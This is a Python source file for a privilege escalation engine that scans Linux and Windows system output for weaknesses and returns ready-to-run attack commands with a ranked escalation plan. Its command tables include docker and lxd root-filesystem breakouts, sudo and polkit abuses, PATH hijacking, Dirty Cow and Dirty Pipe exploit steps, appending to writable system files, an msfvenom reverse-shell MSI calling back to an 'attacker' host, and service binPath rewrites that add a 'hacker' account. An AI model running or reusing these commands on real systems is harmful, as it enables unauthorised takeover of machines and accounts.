"""
Privilege Escalation Engine - Detection and exploitation of privilege escalation vectors
"""

import re
from typing import List, Dict, Any
from datetime import datetime


class PrivEscEngine:
    """Privilege escalation detection and exploitation engine"""
    
    def __init__(self):
        self.vulnerabilities = []
        self.escalation_paths = []
        self.exploitation_history = []
        
        # Known vulnerability signatures
        self.vuln_signatures = {
            "sudo": {
                "pattern": r"sudo.*NOPASSWD",
                "risk": "High",
                "escalation": "sudo -l to see available commands",
                "cve": ["CVE-2019-14287", "CVE-2021-3156"]
            },
            "suid": {
                "pattern": r"^-rws",
                "risk": "High",
                "escalation": "Check GTFO bins for SUID binaries",
                "cve": []
            },
            "cron": {
                "pattern": r"cron|crond",
                "risk": "Medium",
                "escalation": "Check writable cron jobs",
                "cve": []
            },
            "docker": {
                "pattern": r"docker",
                "risk": "Critical",
                "escalation": "docker run -v /:/mnt alpine chroot /mnt bash",
                "cve": ["CVE-2019-5736"]
            },
            "kernel": {
                "pattern": r"Linux version \d+\.\d+",
                "risk": "High",
                "escalation": "Check kernel exploits (DirtyPipe, DirtyCow)",
                "cve": ["CVE-2016-5195", "CVE-2022-0847"]
            },
            "writable_passwd": {
                "pattern": r"/etc/passwd.*writable",
                "risk": "Critical",
                "escalation": "Add new root user to /etc/passwd",
                "cve": []
            },
            "nfs": {
                "pattern": r"/etc/exports.*no_root_squash",
                "risk": "High",
                "escalation": "Mount NFS share as root",
                "cve": []
            },
            "lxd": {
                "pattern": r"lxd",
                "risk": "High",
                "escalation": "lxd init; lxc image import",
                "cve": ["CVE-2019-5736"]
            },
            "mysql": {
                "pattern": r"mysql",
                "risk": "Medium",
                "escalation": "MySQL UDF exploitation",
                "cve": []
            },
            "polkit": {
                "pattern": r"pkexec",
                "risk": "High",
                "escalation": "Check polkit vulnerabilities (CVE-2021-4034)",
                "cve": ["CVE-2021-4034"]
            }
        }
        
        # Linux-specific checks
        self.linux_checks = {
            "CVE-2021-4034": {
                "name": "Polkit pkexec",
                "check": "pkexec --version",
                "exploit": "https://github.com/berdav/CVE-2021-4034"
            },
            "CVE-2022-0847": {
                "name": "Dirty Pipe",
                "check": "uname -r",
                "exploit": "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit"
            },
            "CVE-2016-5195": {
                "name": "Dirty Cow",
                "check": "uname -r",
                "exploit": "https://github.com/dirtycow/dirtycow.github.io"
            }
        }
    
    def analyze_linux(self, data: str) -> List[Dict]:
        """Analyze Linux system for privilege escalation vectors"""
        results = []
        data_lower = data.lower()
        
        for vuln_name, vuln_info in self.vuln_signatures.items():
            if re.search(vuln_info["pattern"], data, re.IGNORECASE):
                result = {
                    "vulnerability": vuln_name,
                    "risk": vuln_info["risk"],
                    "escalation": vuln_info["escalation"],
                    "cves": vuln_info.get("cve", []),
                    "commands": self._get_privesc_commands(vuln_name),
                    "confidence": self._calculate_confidence(vuln_name, data),
                    "detected_at": datetime.now().isoformat()
                }
                results.append(result)
        
        # Check for specific kernel versions
        kernel_version = self._extract_kernel_version(data)
        if kernel_version:
            kernel_check = self._check_kernel_vulnerabilities(kernel_version)
            if kernel_check:
                results.extend(kernel_check)
        
        # Check for path injection
        if "PATH=" in data and "export PATH=" in data:
            results.append({
                "vulnerability": "PATH_injection",
                "risk": "Medium",
                "escalation": "Add malicious directory to PATH",
                "commands": ["export PATH=/tmp:$PATH", "echo '#!/bin/bash\\n/bin/bash' > /tmp/ls", "chmod +x /tmp/ls"],
                "confidence": 0.7,
                "cves": []
            })
        
        # Check for weak umask
        if "umask 0" in data:
            results.append({
                "vulnerability": "Weak_umask",
                "risk": "Medium",
                "escalation": "Files created world-writable",
                "commands": ["umask 0"],
                "confidence": 0.6,
                "cves": []
            })
        
        # Check for writable system files
        writable_files = self._find_writable_files(data)
        if writable_files:
            results.append({
                "vulnerability": "Writable_System_Files",
                "risk": "High",
                "escalation": f"Writable files found: {', '.join(writable_files[:3])}",
                "commands": [f"echo 'malicious' >> {f}" for f in writable_files[:2]],
                "confidence": 0.8,
                "cves": []
            })
        
        return sorted(results, key=lambda x: (x["risk"] == "Critical", x["risk"] == "High", x["confidence"]), reverse=True)
    
    def analyze_windows(self, data: str) -> List[Dict]:
        """Analyze Windows system for privilege escalation vectors"""
        results = []
        data_lower = data.lower()
        
        # Windows-specific checks
        if "seimpersonateprivilege" in data_lower:
            results.append({
                "vulnerability": "SeImpersonatePrivilege",
                "risk": "Critical",
                "escalation": "Use potato exploits (JuicyPotato, PrintSpoofer)",
                "commands": ["JuicyPotato.exe", "PrintSpoofer.exe"],
                "confidence": 0.9,
                "cves": ["CVE-2016-3225"]
            })
        
        if "alwaysinstallelevated" in data_lower:
            results.append({
                "vulnerability": "AlwaysInstallElevated",
                "risk": "High",
                "escalation": "Create malicious MSI package",
                "commands": ["msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o malicious.msi"],
                "confidence": 0.85,
                "cves": []
            })
        
        if "unquoted service path" in data_lower:
            results.append({
                "vulnerability": "Unquoted_Service_Path",
                "risk": "High",
                "escalation": "Place malicious binary in path",
                "commands": ["sc qc service_name", "copy malicious.exe 'C:\\Program Files\\Vulnerable Path\\'"],
                "confidence": 0.8,
                "cves": []
            })
        
        if "modifiable service binpath" in data_lower:
            results.append({
                "vulnerability": "Modifiable_Service_Binary",
                "risk": "Critical",
                "escalation": "Replace service binary with malicious executable",
                "commands": ["sc config service_name binPath= \"C:\\malicious.exe\"", "sc start service_name"],
                "confidence": 0.85,
                "cves": []
            })
        
        if "weak service permission" in data_lower:
            results.append({
                "vulnerability": "Weak_Service_Permissions",
                "risk": "High",
                "escalation": "Modify service configuration",
                "commands": ["sc config vulnerableservice binPath=\"cmd.exe /c net user hacker P@ssw0rd /add\""],
                "confidence": 0.75,
                "cves": []
            })
        
        return sorted(results, key=lambda x: x["confidence"], reverse=True)
    
    def _get_privesc_commands(self, vuln_type: str) -> List[str]:
        """Get specific commands for privilege escalation"""
        commands_map = {
            "sudo": [
                "sudo -l",
                "sudo -u root /bin/bash",
                "sudo -u#-1 /bin/bash"
            ],
            "suid": [
                "find / -perm -4000 -type f 2>/dev/null",
                "find / -perm -2000 -type f 2>/dev/null",
                "find / -perm -4000 -user root 2>/dev/null"
            ],
            "cron": [
                "cat /etc/crontab",
                "ls -la /etc/cron*",
                "cat /var/spool/cron/crontabs/*"
            ],
            "docker": [
                "docker images",
                "docker run -it -v /:/mnt alpine chroot /mnt bash",
                "docker run --rm -v /:/mnt/root alpine chroot /mnt/root bash"
            ],
            "kernel": [
                "uname -a",
                "cat /etc/os-release",
                "searchsploit Linux Kernel"
            ],
            "lxd": [
                "lxc image list",
                "lxc init ubuntu:18.04 container -c security.privileged=true",
                "lxc config device add container mydevice disk source=/ path=/mnt/root recursive=true"
            ],
            "polkit": [
                "pkexec --version",
                "pkexec /bin/bash"
            ]
        }
        return commands_map.get(vuln_type, ["Manual enumeration required"])
    
    def _calculate_confidence(self, vuln_name: str, data: str) -> float:
        """Calculate confidence score for vulnerability"""
        confidence_map = {
            "sudo": 0.85,
            "suid": 0.9,
            "cron": 0.7,
            "docker": 0.95,
            "kernel": 0.6,
            "writable_passwd": 0.98,
            "nfs": 0.8,
            "lxd": 0.85,
            "polkit": 0.9
        }
        
        base_confidence = confidence_map.get(vuln_name, 0.5)
        
        # Adjust confidence based on data context
        if "exploit" in data.lower():
            base_confidence += 0.1
        if "vulnerable" in data.lower():
            base_confidence += 0.1
        if "CVE" in data:
            base_confidence += 0.15
            
        return min(base_confidence, 1.0)
    
    def _extract_kernel_version(self, data: str) -> str:
        """Extract Linux kernel version from data"""
        match = re.search(r'Linux version (\d+\.\d+\.\d+[^\s]*)', data)
        if match:
            return match.group(1)
        return None
    
    def _check_kernel_vulnerabilities(self, kernel_version: str) -> List[Dict]:
        """Check kernel version against known vulnerabilities"""
        vulnerabilities = []
        
        # Parse version numbers
        parts = kernel_version.split('.')
        if len(parts) >= 2:
            major = int(parts[0])
            minor = int(parts[1])
            
            # Dirty Cow (CVE-2016-5195)
            if major == 4 and minor <= 8:
                vulnerabilities.append({
                    "vulnerability": "dirty_cow",
                    "risk": "High",
                    "escalation": "Dirty Cow privilege escalation (CVE-2016-5195)",
                    "commands": ["gcc -pthread dirtycow.c -o dirtycow", "./dirtycow"],
                    "confidence": 0.85,
                    "cves": ["CVE-2016-5195"]
                })
            
            # Dirty Pipe (CVE-2022-0847)
            if (major == 5 and minor >= 8 and minor <= 16) or (major == 5 and minor == 17 and kernel_version < "5.17.5"):
                vulnerabilities.append({
                    "vulnerability": "dirty_pipe",
                    "risk": "Critical",
                    "escalation": "Dirty Pipe privilege escalation (CVE-2022-0847)",
                    "commands": ["gcc exploit.c -o exploit", "./exploit"],
                    "confidence": 0.9,
                    "cves": ["CVE-2022-0847"]
                })
        
        return vulnerabilities
    
    def _find_writable_files(self, data: str) -> List[str]:
        """Find writable system files in data"""
        writable = []
        lines = data.split('\n')
        for line in lines:
            if 'writable' in line.lower():
                match = re.search(r'/(?:etc|usr|var|home)/[^\s]+', line)
                if match:
                    writable.append(match.group())
        return writable[:5]
    
    def generate_escalation_plan(self, findings: List[Dict]) -> List[Dict]:
        """Generate prioritized escalation plan"""
        plan = sorted(findings, key=lambda x: (
            x.get("risk") == "Critical",
            x.get("risk") == "High",
            x.get("confidence", 0)
        ), reverse=True)
        
        for i, step in enumerate(plan):
            step["order"] = i + 1
            step["estimated_success"] = self._estimate_success(step)
            step["execution_commands"] = self._get_privesc_commands(step.get("vulnerability", ""))
        
        return plan
    
    def _estimate_success(self, finding: Dict) -> str:
        """Estimate success probability"""
        confidence = finding.get("confidence", 0)
        if confidence > 0.8:
            return "Very High"
        elif confidence > 0.6:
            return "High"
        elif confidence > 0.4:
            return "Medium"
        else:
            return "Low"


# Singleton instance
privesc_engine = PrivEscEngine()